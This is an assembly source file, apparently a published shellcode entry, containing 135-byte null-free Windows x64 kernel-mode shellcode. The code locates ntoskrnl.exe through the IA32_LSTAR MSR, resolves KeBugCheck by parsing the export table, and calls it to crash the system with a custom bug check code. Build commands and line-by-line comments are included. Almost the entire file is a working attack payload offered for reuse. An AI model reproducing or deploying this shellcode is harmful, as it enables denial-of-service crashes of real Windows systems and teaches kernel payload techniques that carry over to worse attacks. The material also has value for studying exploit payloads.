; Title: Windows x64 Kernel-mode (Ring 0) KeBugCheck with custom value shellcode (Null-Free, 135 Bytes)
; Author: Azsec324
; Date: 2026/09/06
; Tested on: Windows 10 22H2 (OS Build 19045.6456, Kernel Base 10.0.19041.1)
; Description: Attempts to locate ntoskrnl.exe using IA32_LSTAR processor MSR, locates and resolves KeBugCheck, aligns the stack, and calls it with a custom bug check code.
; License: Released under MIT License. Check LICENSE file or visit https://opensource.org/licenses/MIT
; Copyright (c) 2026 Azsec324


; =====COMMAND=====
; This code is MASM compatible. Run:
; 
; ml64 /c win64_bugcheck.asm
; dumpbin /rawdata /section:.text$mn win64_bugcheck.obj
;
; ...to get the binary. Or just copy from the .txt file



; =====CODE=====
;
; A little header for masm
.code
shcode PROC

; Load address for nt!KiSystemCall64 from model specific register (MSR)
cld ; Clear df flag for string comparison to work properly later
mov ecx, 3fffff7dh ; NOT for 0xc0000082 - the msr for IA32_LSTAR
not ecx ; Restore value
rdmsr ; Now, EDX:EAX is supposed to hold the addr for nt!KiSystemCall64. Gotta piece them together
shl rdx, 32 ; Make the high bits of the address actually "high" by shifting left
or rax, rdx ; Piece the address together, now in RAX

; Scan 2MB blocks for PE header
push -1 ; Push a 0xffffffffffffffff onto the stack
pop rcx
shl rcx, 21 ; RCX is now 0xffffffff'ffe00000 (mask for 2MB boundary)
and rax, rcx ; Align the address with 2MB page boundary
neg ecx ; RCX is now 0x200000
scan:
cmp word ptr [rax], 5a4dh ; Check for 'MZ'
jz scand
sub rax, rcx ; Scan backwards for one 2MB page
jmp scan

; Load export table and lists
scand: ; RAX now holds base addr for ntoskrnl.exe
mov ebx, [rax+3ch] ; Load e_lfanew from DOS_Header
add rbx, rax ; Now RBX holds the start of NT_Header
xor ecx, ecx
mov cl, 88h
mov ebp, [rbx+rcx] ; Load RVA for Export Table
add rbp, rax ; RBP now holds real addr for Export Table

mov r11d, [rbp+1ch]
add r11, rax ; R11 is now E-Address Table
mov r12d, [rbp+20h]
add r12, rax ; R12 is now E-Name Table
mov ebx, [rbp+24h]
add rbx, rax ; RBX is now E-Ordinal Table

; Locate function 'KeBugCheck' --NOTE: Derived and adapted from the user-mode calc shellcode I wrote a while ago
push rdx ; Add terminator (as its current lower bits have zero)
mov rdx, 6b63656843677542h ; ASCII of 'kcehCguB' ('BugCheck' in reverse, cuz endianess)
push rdx ; Now RSP should point to the string 'BugCheck'
locate: 
xor edx, edx ; Clear accumulator (No need to clear RCX, since "mov cl" below would overwrite data, plus the high 56 bits are empty)
loopi:
mov cl, 9h ; Restore length - the length of 'BugCheck' + terminator
mov rsi, rsp ; Restore original string
mov edi, [r12+rdx*4] ; Traverse E-Name Table to fetch the correct index, got RVA
lea rdi, [rdi+rax+2] ; Get addr to name at offset 2 (To skip 'Ke' in the name)
repe cmpsb ; Compare strings at RDI & RSI, with RCX as length to compare
jz resolve ; If match found
inc edx
jmp short loopi

resolve:
mov dx, [rbx+rdx*2] ; Get index from E-Ordinal
mov esi, [r11+rdx*4] ; Get RVA from E-Address
add rsi, rax ; Add base address, get real function addr, put into RSI
; The end of Locate!

; Time to call KeBugCheck with custom code
mov ecx, 0deadbeefh ; Load the custom code - Change this if you want a different value
and spl, 0f0h ; To align the stack to 16-byte, for Windows api to function
call rsi ; Just call the thing. We're done here

; Ending cap on top!
shcode ENDP
END
